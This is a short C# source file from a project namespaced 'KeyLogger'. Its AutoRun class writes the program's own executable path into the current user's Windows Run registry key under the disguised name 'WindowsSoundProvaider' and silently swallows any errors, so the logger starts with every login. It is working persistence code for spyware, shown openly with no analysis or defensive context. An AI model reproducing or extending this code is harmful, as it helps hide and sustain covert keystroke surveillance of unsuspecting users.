using Microsoft.Win32;

namespace KeyLogger
{
    public class AutoRun
    {
        public static void SetAutoRunValue()
        {
            const string name = "WindowsSoundProvaider";
            var exePath = System.Windows.Forms.Application.ExecutablePath;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue(name, exePath);
                reg.Flush();
                reg.Close();
            }
            catch
            {
            }
        }
    }
}